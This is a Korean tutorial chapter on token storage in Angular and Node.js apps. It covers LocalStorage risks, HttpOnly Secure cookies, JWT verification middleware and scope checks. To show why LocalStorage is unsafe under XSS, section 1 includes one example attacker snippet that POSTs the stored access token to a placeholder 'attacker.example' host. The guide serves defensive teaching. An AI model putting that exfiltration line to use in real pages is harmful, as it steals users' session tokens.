# 09. Fullstack Token Storage Angular and Node.js (풀스택 환경에서의 토큰 보관 및 통신)

Angular SPA와 Node.js(또는 ORDS 앞단의 API)를 함께 쓰는 풀스택 환경에서 가장 흔한 질문이 있습니다. **"토큰을 어디에 저장할까?"** 잘못 선택하면 XSS 한 방으로 계정 탈취가 가능합니다.

이번 강의에서는 LocalStorage의 위험, HttpOnly Secure Cookie 패턴, Node.js 미들웨어에서의 JWT 검증과 Scope 체크를 다룹니다.

## 1. 왜 LocalStorage에 Access Token을 두면 위험한가?

`localStorage`/`sessionStorage`는 JavaScript에서 자유롭게 읽을 수 있습니다. SPA에 XSS(Cross-Site Scripting)가 발생하면 공격 스크립트가 토큰을 읽어 외부로 전송할 수 있습니다.

```javascript
// 공격자 입장에서 XSS가 성공했을 때
fetch("https://attacker.example/steal", {
  method: "POST",
  body: localStorage.getItem("access_token")
});
```

XSS는 입력 미이스케이프, 위험한 `innerHTML`, 취약한 서드파티 스크립트 등으로 여전히 발생합니다. 따라서 **"XSS가 없을 것"을 전제로 LocalStorage에 토큰을 두는 설계는 취약**합니다.

요약:

- LocalStorage: XSS에 직접 노출
- JS 메모리 변수: 일부 완화되지만 XSS 중에는 여전히 읽힐 수 있음
- HttpOnly Cookie: JS가 읽을 수 없음 → XSS로 토큰 문자열 직접 탈취 불가(다만 브라우저가 자동 첨부하므로 CSRF 대책 필요)

## 2. 권장 방향: HttpOnly & Secure Cookie

브라우저가 보관하되 JS는 못 읽게 하는 속성이 **HttpOnly**입니다.

```http
Set-Cookie: access_token=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
Set-Cookie: refresh_token=...; Path=/auth/refresh; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
```

의미:

- **HttpOnly**: `document.cookie`로 접근 불가
- **Secure**: HTTPS에서만 전송
- **SameSite**: CSRF 완화 (`Lax`/`Strict`)
- Refresh는 더 좁은 `Path`로 노출면 최소화

### Angular 측 통신

쿠키 기반이면 Angular는 토큰을 헤더에 직접 넣지 않고, same-origin 요청에 쿠키를 포함시킵니다.

```typescript
// app.config.ts 또는 HttpClient 설정
export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(withFetch()),
  ]
};

// API 호출 시
this.http.get("/api/orders", { withCredentials: true });
```

> Cross-origin이면 CORS `Access-Control-Allow-Credentials: true`와 정확한 `Allow-Origin`(와일드카드 금지)이 필요합니다. 가능하면 **Same-site BFF**가 단순합니다.

## 3. Node.js 미들웨어에서 JWT 검증

쿠키 또는 Authorization 헤더에서 토큰을 추출한 뒤 서명과 클레임을 검증합니다.

```javascript
// auth.middleware.js
const jwt = require("jsonwebtoken");

function extractToken(req) {
  const header = req.headers.authorization;
  if (header?.startsWith("Bearer ")) {
    return header.slice(7);
  }
  // 쿠키 기반 전달
  return req.cookies?.access_token || null;
}

function requireAuth(req, res, next) {
  try {
    const token = extractToken(req);
    if (!token) {
      return res.status(401).json({ error: "missing_token" });
    }

    const payload = jwt.verify(token, process.env.JWT_PUBLIC_KEY, {
      algorithms: ["RS256"],
      issuer: process.env.JWT_ISSUER,
      audience: process.env.JWT_AUDIENCE
    });

    req.user = payload;
    next();
  } catch (err) {
    return res.status(401).json({ error: "invalid_token" });
  }
}

module.exports = { requireAuth };
```

## 4. Scope / Role 체크 구현

인증(토큰 유효)과 인가(권한 충분)를 분리합니다.

```javascript
function requireScope(required) {
  return (req, res, next) => {
    const scopes = String(req.user?.scope || "").split(" ").filter(Boolean);
    const needed = Array.isArray(required) ? required : [required];

    const ok = needed.every((s) => scopes.includes(s));
    if (!ok) {
      return res.status(403).json({ error: "insufficient_scope", required: needed });
    }
    next();
  };
}

// 사용 예
app.get("/admin/metrics", requireAuth, requireScope("admin:read"), (req, res) => {
  res.json({ cpu: 0.42 });
});

app.delete("/orders/:id", requireAuth, requireScope("orders:write"), async (req, res) => {
  await deleteOrder(req.params.id, req.user.sub);
  res.status(204).end();
});
```

ORDS(Oracle REST Data Services) 앞단에 Node.js API Gateway/BFF를 두는 경우에도 동일합니다. ORDS 진입 전에 미들웨어가 JWT를 검증하고, 통과한 요청만 프록시합니다.

```javascript
app.use("/ords", requireAuth, requireScope("ords:access"), createProxyMiddleware({
  target: process.env.ORDS_BASE_URL,
  changeOrigin: true
}));
```

## 5. 실무 권장 아키텍처 (요약)

1. **최선에 가까운 선택**: BFF가 토큰을 보관하고 브라우저는 세션 쿠키만 사용 (13강에서 상세)
2. **차선**: Access/Refresh를 HttpOnly Secure SameSite 쿠키로 전달
3. **비권장**: Access Token을 LocalStorage에 저장 후 JS가 Authorization 헤더로 부착

```text
[Angular] --HttpOnly Cookie--> [Node.js API]
                                  |- verify JWT signature
                                  |- check scope/roles
                                  |- call ORDS / downstream
```

다음 단계에서는 앱이 여러 개로 늘어날 때 필요한 **IAM과 SSO**로 시야를 넓힙니다.

---

### Chapter Summary (챕터 요약)

- LocalStorage 토큰 저장은 XSS 탈취에 취약하므로 SPA 보안 기본값으로 적합하지 않다.
- HttpOnly + Secure + SameSite 쿠키는 JS의 직접 토큰 읽기를 막고 HTTPS/CSRF 측면을 강화한다.
- Node.js 미들웨어에서는 서명 검증과 `iss`/`aud`/`exp` 확인 후 Scope 기반 인가를 분리 구현한다.
- Angular는 `withCredentials`로 쿠키를 전송하고, 가능하면 BFF 패턴으로 브라우저의 토큰 노출을 더 줄인다.
